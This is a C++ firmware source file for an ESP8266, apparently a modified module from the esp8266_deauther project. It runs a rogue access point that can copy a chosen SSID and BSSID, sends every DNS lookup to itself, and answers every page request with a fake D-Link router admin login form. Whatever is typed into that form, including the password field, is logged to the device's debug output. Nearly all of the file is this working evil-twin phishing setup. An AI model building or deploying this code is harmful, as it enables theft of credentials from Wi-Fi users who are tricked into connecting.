/*
   Copyright (c) 2020 Stefan Kremser (@Spacehuhn)
   This software is licensed under the MIT License. See the license file for details.
   Source: github.com/spacehuhn/esp8266_deauther
*/

#include "ap.h"
#include "debug.h"
#include "strh.h"
#include "scan.h"

#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <ESP8266mDNS.h>
#include <DNSServer.h>

extern "C" {
#include "user_interface.h"
}

typedef struct ap_settings_t {
  bool enabled;
  bool paused;
  char ssid[33];
  char pswd[65];
  uint8_t ch;
  bool hidden;
  uint8_t bssid[6];
} ap_settings_t;

namespace ap {
// ========== PRIVATE ========= //
ESP8266WebServer server(80);
DNSServer dnsServer;
IPAddress apIP(192, 168, 4, 1);
IPAddress netMsk(255, 255, 255, 0);
ap_settings_t ap_settings;

const String DLINK = "<!DOCTYPE html><html><head><title>D-Link Router</title><style>body{font-family:Arial;text-align:center;margin:0;padding:0}#bar{display:flex;flex-direction:row;justify-content:space-evenly;align-items:center;gap:1em;height:3em;background-color:#f6f6f6;padding:1em;border:2px solid #c7c7c7}.img{max-height:75%}.lg{padding:1em;width:50%;max-width:25em;margin:auto;background:linear-gradient(#ffff,#f1f1f1);border:2px solid #c7c7c7;border-radius:.25em}.f,.lg{display:flex;flex-direction:column;align-items:center;gap:1em}.c{width:100%;height:100vh;display:flex;flex-direction:column}.t{font-weight:700}.lgbtn{background:#4598aa;color:#fff;width:fit-content;padding:1em 3em 1em 3em}.in{width:100%;height:2em}.f{width:100%}</style></head><body><div class=\"c\"><div id=\"bar\"><img class=\"img\" src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAAApCAYAAABwQGa5AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAA4RSURBVHhe7Z0LdFxFGcfvbBrLQx6KIKK8fBTIBioKyFugPESs2uMDDqVNeImiCCdNVESPAuXVbAqoR8QHzaYFoUCPVUQElZciUisC2VYLiII8WpRHeVRosuP/d+9uTJpNcmd2724S8z/9Z+beNLP3zsw3880333xrggmMOqQz2bcqmSUeJTaIbxJfFrvFpeKCXGvTWqX/F0hf3JUKJtndlZ2k914e3a0OBglIYyb7DiWbR1eVhQ3/BesCa1/MtTU/H92dQBF7tHeleo39krJfEzcNb5bGs+JJ6iw3RZfjD7tmrq6rC3r2VXaGeKxIvwRH6b1vLeQTR5+ApDNdahD7a2U/EN1JHOvEFeLvxUV66T9wsxrQCL29kpvFbcIblUNe/KHe5evRZXzsnumsywcmq+zM6M6I6BGn67NuiS7HPtQu2yk5WDxGPFrcStwQZ+idv1PIJ45+ApJtVdIeXVUdr4l02Dl6+cfCOwlC7/o9JadFVxVHm94hU8jHhp6pTcmF4qTwRjysWh/U77qq9Xhm5jEFaSqb6KHfrSyq054is8Uu4mbiZHEoVFVAUvxId2TfouQM8jUCFcJUer86yvTwTkJQ+VOVnBBdVRwPaxb+USEfG+lM545KEBAX4QBT6m3P2wv5MQHV/77inRKOR3X5W3GB2CIeINIPhxOOqiMUEK0MTtTPHcJ8bbGFuFQVyOI0KXxVHE6/LwcX5Fp91lbmc/qxdZR3gzH2DYXsqEe6o4tn7RBRo7YVmS3qxVFrLIoEJAh+Id4mItG/E/8j+uAecUmBPxGfEl1BZS2RkOwUXVYcjFJ04hfEV7hRAfSKSzXQXBddxkdjRxezBotQH6ywqeDxQn70w1oGAlSpMYNQQKTTdRsbfFjZw8VponNDR7BSk6waO+SnxD1002dNsYl4bbpjoavKEQcfEtF9IarNyaKvDv9lETPszuKsXFuT88Bird1PCc/hCgwCc3MtTSzWxwo+K2KuXiX+gxujHSWnNo3eLDLnRFfxIUEbVJ7KYnS8NrpyAp32NJX5g+gyGTTOX1hn83n0YddO+pKxduvutmYMDN5Q/XxRyeXRVWy8Ll6iKjpPKl3ZAqJnmKKEgeIV1fd54c0EoM9hQc6zM3vzmXeJrqiNFas/Kiwg6JjYrQ8Jb7hhjR5xz1zrbB9VLTb0jPcqcTVvP6L3fU8h7w199neVoHrEAYMGG2VzlbtZM9b68K4HGjo6Jxtr9laWDcmPimxOrtY7vU1pSaQznZrRza7K7iVieXqn+GYRPC3eLi5WGezTDIvG9uxO1nhpF+NLQIDKo/PdLSIsrmDX+KRCPhHo+Vg7oeq44K96LjpLWdBnX6wEVW0oIBT/FHnGxeLt+tznG+Z3GpM3OwSp9Y/nWk4ZUUVMf2uRCV7vpfPvJrJIRqXGrPpGsdhu/1LZg4wFekb2jT4mSm0OGkU2kkupv6zFVoozVc6D4Z0hkKSApNsXSkXPO1vDjLEvd7c2Dxh0iov0RKHav0/JwujKGTMLApYkfNcglcB8ETXyz2JO/KOIwQRzMbvqrAkR3tnqGEvU8C+qPvaWcCzSvXuDfP3+SgdAv99anCpOF88Ur5BwMECxGftTkY1MZgGsSKUHtXkLjP7uvSLqH8J5mYhgMWMMtTasExGga9KZLgSvqtCzHiwuDUx+ud5qmSPvs9JWCkX1oSoC0t3aZNUFv6nsi9EdJ2AavHC3jgUlG3KsQ51+jbHB6coeqr5KB5ymxmK0Pi2wJqPfM2M8qetN1fgz1GRYCFFZjxcxlWJs6IP+D6osA9Id4vUiAsjimH0G3DUwgAxVlyY9L1uvMg4KUqlrdI1nBftj/B2dPy7SGnOS2msqCT0zgnmDiLrIzP4uR2K9/ZM4AFURECB9+Qkl7GD74JCUTVXLBabq6G5r6pEQvKC11nNK1+bmNK1TB6sPjN1RDX+0iBqGKb5TRHi2FIcC6xlM5Pwf1AyXNt5S/5tOhmBhXGG28B2YPllIE4fqh+dkpvPaSxJweTpXdT/I4FE1AYlgLtCPZ6K8E3jO+Xt0dI3LWUQNvIt4oDhDPEu8QnWFj9VvRDosqhYDxLBOpPo7rETleCIwSxQX7OXW9T5TLkp+1k+3YzgI5oqagZ2AJQ2tplk8QcJRcj1UVQHRCPmSkq9EV87Yt9faAwv5cQN1ajo+woAv2o9FdppRiT4osr8ynEo0APpPzylhJGUR+2/u1RCb1dcb1jjJwhjqChO1izAyQ7dp4TlXgpEV7y/cH4QqzyDAXq0fLEhdQQWMq7UIligl+GChEhWd9LzbRGu9J9XYZ6vh2Vv5dnS3lkhWQDS4sLH9DdHF3QY16nw9W+eK1iasbsOiZGfTB1fUzLshVD6WFzaJXBZ+gN3jvUpJfLo9u73eBrt+XFMyZd2qsrAKsUAbZA0aAWWbefW5hylh5ijHQa9Zz4Gb/ACo7M8ouTK6csar4kMiworatpHoDGODnbW++nvhcgDKNfPq/diDwSKXDu/GA9bKS8VzVEYsr4cazCBIpWFjzuccA8/L6DgAqqypKpSFJaZPOkscYnY+QqwlOI+C+ZVTgux1jAagBn9BnB5Yy17JKYV7owbpTBcDykVkwxvxcYtGcBbjsV2CaiIg3a2zGb3PETk05YoZWpj1jbgSDqw1CAa6/MYiv4tDPnuZWDOosYpmyU+L53JvFOBKdSA2Z5/NtTWzcYhK7Omblwi20kSA0cLVSsYe0ElSQ52OKtdEQIAq/gEljJyu2EILs/5+U1QWNnBXzNMz1NRhTo2FeXediH/S36K7NUepNuEs/GgB+zIcSXbpuzhHYqlytqDWTEAKYNfYB8wUzB54C/sc9MINYhQsYgdgxAVjlVDKj2q0PBvgGK7Lohw/PlxfHoku3VBrAcHdwRUstFY3Rk6Q80RXlwZ8bTgWi9v1BAZBS+vxAzytT1Vb+w7EtRMQjf4ssNgVdsXTxtg1akX2CVwX2TT+z+pS5lfR5QTGOe7JBxYPBG/UREDS7V2M/ux+hqqSI27qntPMIh/zIycD2RCLQ/TPxRohT36wJTQSTGD84zWTj7XzMCRqM4MYy5lzn9ljfWD6/Lkw1TKDxOVhkgrporNxMag6NGNuLDaIJ6YznR8p3J5AsjjEpIJTp2YWeUtJ1QUk3R6aZfEw9Xnoe6yx4S689Eoc++534MqVMXZOKw0JBK7nxymLdywetlfp1QkcMYHkwQZne0/Q29xwmZ+QVH8GMQE7vD4n8Vg/XL6ipXmsLSIvERGOj4tFb9MxE4lkHAAHz0tNT2/cgHwDUFUB0UhK5Dz2LXzwqA3szwv5MYGGjiy+SDRMeYrwBMoF4aQuV/9z9fitnoA0zsvSSQgIUCqcZBx0rGhtZkNtzMDY4H1KJmaLygK3F59+wJmR6yQkTh7hVRMQmwrjIc2OrpzxqEroKuTHEnz2eSYwPDhTdLboE7sNFfd6CUns+ANVERA9EKMoHsI+QRtYc1yYa23Gw3SsYZ9COoHK4ZnU+kl45GLo8JlJOKZ8g/oknt8jolozCKFlXN3Ji1guGcEZMUlUfI2QznTiyu/7zhMYBg+dPdMGqRRBJPCk8NnTYi18o4RkUJCGDZG4gDRkOgn16XuKELeQizV7JL328IngOIJQGWaP4ndaxMHEQt4BuZZZNjApPKA5T+MDQhktachkh4wDBgYJSGN0xhcJKxvpTJcxgcGZcEDkDQcsybU23VjIJ4Ld28OAylSWKzgKWxIambC/Dzq3MgJ8BWSov6u5wFljh3wG/cb1sFwRfX+XmzOrRwo40V2GjcE1DHbSA96Rbg+/0ask+gREjTpZ3NYaQxAzAoQ5Q3+/eT9uqWrgi1CcTyYW8LDId5YkAj0fcZ8m543lXAF6qSu2S3dk92vU+qpIlbeRyIiEtY7NQRcMF6lkOBAIrhT42jYPWJ/ZdAiY4SyWLrNrfwxY1+XamrBqcbBrdXjDHVM0lNytdjtUHPTuoYTrFxwdxTeKuEy+oVNA/+OVfBidxWekwOX6WM0ehLKsKPSu71dykEjj8d5U7pCzwQjg0BWhQIvxeZk5iDk7Uh0u17uFFi49D4e3UEPxLuDglCsI1MB3qzygMsO4YyoTP7Xviz6R1Jmx0e/XqrxwZFZ5n1fiE+6T9jtLXKOywrMYKovRmhmbA3NsnroCtZvvFLlTfCqVsnc/1NLcq3I5+kCAO9+vtmAtw0lXnBs5q0QsstWmMdOVsoElmoZP4yQBhOx0VWhZXpiloEpk1OI8Ox2ylggFJJ1ZqAEqT2ckyBp2+nKwRpwWGPNwYC0dG0EtE/ZIrf9uU70xy3Kk2RcESmhQeWs1JuN67jt7bAgsnIerLgmPRPuyx4GnNoNOJXAXwoHb+Sei65oDCT4iCeEoANWx1sLxP5g8JyM5/12ucICNAmMfk3Bg46+AcASvSr8gQiNgtPY5Hl3EKrWpVGaDk2qlhAOs0QjDmf4Q+gy+34aAd77fb9MfzMynsAYheJbvgqlSQE05rqe3Z3+9pNfJr5GwWxiZPDgzuqo5GO0Z/5r0s1KWxGtzc5r5QiC+LawSWKzyQpVNbYLKi6rk6wd3VSElSFslsbC7dWCEez0rR4aPFMs5wozKPAOhZqHKlMeZbteGorKG8o7dMIRjcfGDuZZD84TKRxCWqZhfahonIniiSHd0bhNYw4hYidG6HPCuhOpZqbonbA2xncoF52Kmqcy/qEz0cJ8z+v3B6Mk36BL6pw8qm7i/GE5YKMc9yfmEesoBxtS9bINedPtKBbXmnY/RM5aMK9A4r3OSTRmiTBIUg/0OIsjEmQj4xq7zVa7aJgj+C2h+UO7A1nN7AAAAAElFTkSuQmCC\"><div>Model Name: COVR-2600R</div><div>Hardware Version: A1</div><div>Firmware Version: 1.0</div></div><div class=\"lg\"><div class=\"t\">Admin Password:</div><form method=\"GET\" class=\"f\"><input class=\"in\" type=\"password\" name=\"password\"> <input type=\"submit\" class=\"lgbtn\" value=\"Log In\"></form></div></div></body></html>\n";
//const String CSS = "body {font-family: Arial; text-align: center; margin: 0; padding: 0;} #bar {display: flex; flex-direction: row; justify-content: space-evenly; align-items: center; gap: 1em; height: 3em; background-color: #f6f6f6; padding: 1em; border: 2px solid #c7c7c7; } .img {max-height: 75%;} .lg {padding: 1em; width: 50%; max-width: 25em; margin: auto; background: linear-gradient(#ffff, #f1f1f1); border: 2px solid #c7c7c7; border-radius: 0.25em;} .lg, .f {width: 100%; display: flex; flex-direction: column; align-items: center; gap: 1em;} .c {width: 100%; height: 100vh; display: flex; flex-direction: column;} .t {font-weight: bold;}.lgbtn{background: #4598aa; color: white; width: fit-content; padding: 1em 3em 1em 3em;} .in {width: 100%; height: 2em;}";

uint8_t* client_to_mac(IPAddress ip) {
  unsigned char number_client;
  struct station_info* stat_info;

  number_client = wifi_softap_get_station_num();
  stat_info = wifi_softap_get_station_info();
  /*
    debuglnF("[ ========= Clients ========= ]");

    if(number_client == 0) {
      debuglnF("No clients connected");
      return;
    }
    debuglnF("ID IP-Address      MAC-Address");
    debuglnF("====================================");
  */
  int i { 0 };
  struct ip_addr* IPaddress;
  IPAddress address;

  while (stat_info) {
    IPaddress = (ip_addr *)&stat_info->ip;
    address = IPaddress->addr;

    if (address == ip) {
      return stat_info->bssid;/*
                debug(strh::right(2, String(i)));
                debug(' ');
                debug(strh::left(15, address.toString()));
                debug(' ');
                debug(strh::left(17, strh::mac(stat_info->bssid)));
                Debugger::debugln();*/
    }
    stat_info = STAILQ_NEXT(stat_info, next);
    ++i;
  }

  //debuglnF("====================================");
  //Debugger::debugln();

  return NULL;
}

void handle_404() {
  server.send(200, "text/html", DLINK);

  //  debug(strh::left(13, server.client().remoteIP().toString()));
  //  debug(' ');
  //  debug(strh::left(17, strh::mac(client_to_mac(server.client().remoteIP()))));
  //  debug(' ');
  //  debug(server.uri());
  //
  for (int i = 0; i < server.args(); i++) {
    debug(i == 0 ? '?' : '&');
    debug(server.argName(i));
    debug("=");
    debug(server.arg(i));
  }
  Debugger::debugln();
}

// ========== PUBLIC ========= //
void start(String& ssid, String& pswd, bool hidden, uint8_t ch, uint8_t* bssid) {
  if (ssid.length() == 0) {
    Debugger::debugln("ERROR: SSID empty");
    return;
  }

  if (ssid.length() > 32) {
    Debugger::debugln("WARNING: SSID longer than 32 characters");
    ssid = ssid.substring(0, 32);
  }

  if (pswd.length() > 0 && pswd.length() < 8) {
    Debugger::debugln("WARNING: Password must have at least 8 characters");
    pswd = String();
  }

  if (ch < 1 || ch > 14) {
    Debugger::debugln("WARNING: Channel must be between 1-14");
    ch = 1;
  }

  stop();
  scan::stopST();

  ap_settings.enabled = true;
  ap_settings.paused = false;
  strncpy(ap_settings.ssid, ssid.c_str(), 32);
  strncpy(ap_settings.pswd, pswd.c_str(), 64);
  ap_settings.hidden = hidden;
  ap_settings.ch = ch;
  memcpy(ap_settings.bssid, bssid, 6);

  wifi_set_macaddr(SOFTAP_IF, ap_settings.bssid);
  WiFi.softAPConfig(apIP, apIP, netMsk);
  WiFi.softAP(ap_settings.ssid, ap_settings.pswd, ap_settings.ch, ap_settings.hidden);

  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(53, "*", apIP);

  MDNS.begin("deauth.me");

  server.onNotFound(handle_404);

  server.begin();

  debuglnF("[ ========= Access Point ========= ]");

  debugF("SSID:      ");
  Debugger::debugln(ap_settings.ssid);

  debugF("Password:  ");
  Debugger::debugln(ap_settings.pswd);

  debugF("Mode:      ");
  //Debugger::debugln(ap_settings.pswd == '\0' ? "WPA2" : "Open");

  debugF("Hidden:    ");
  Debugger::debugln(strh::boolean(ap_settings.hidden));

  debugF("Channel:   ");
  Debugger::debugln(ap_settings.ch);

  debugF("BSSID:     ");
  Debugger::debugln(strh::mac(ap_settings.bssid));

  Debugger::debugln();

  debuglnF("Type 'stop ap' to stop the access point");

  debuglnF("[ =================== Connections =================== ]");
  debugF("IP-Address   ");
  debug(' ');
  debugF("MAC-Address      ");
  debug(' ');
  debuglnF("URL");
  debuglnF("======================================================");
}

void stop() {
  if (ap_settings.enabled || ap_settings.paused) {
    WiFi.persistent(false);
    WiFi.disconnect(true);
    WiFi.mode(WIFI_STA);
    wifi_set_opmode(STATION_MODE);

    ap_settings.enabled = false;
    ap_settings.paused = false;

    debuglnF("> Stopped access point");
    Debugger::debugln();
  }
}

void pause() {
  if (ap_settings.enabled && !ap_settings.paused) {
    stop();
    ap_settings.paused = true;
  }
}

void resume() {
  if (!ap_settings.enabled && ap_settings.paused) {
    WiFi.softAP(ap_settings.ssid, ap_settings.pswd, ap_settings.ch, ap_settings.hidden);

    ap_settings.enabled = true;
    ap_settings.paused = false;

    debuglnF("> Resumed access point");
    Debugger::debugln();
  }
}

bool paused() {
  return ap_settings.paused;
}

void update() {
  if (ap_settings.enabled) {
    server.handleClient();
    MDNS.update();
    dnsServer.processNextRequest();
  }
}
}
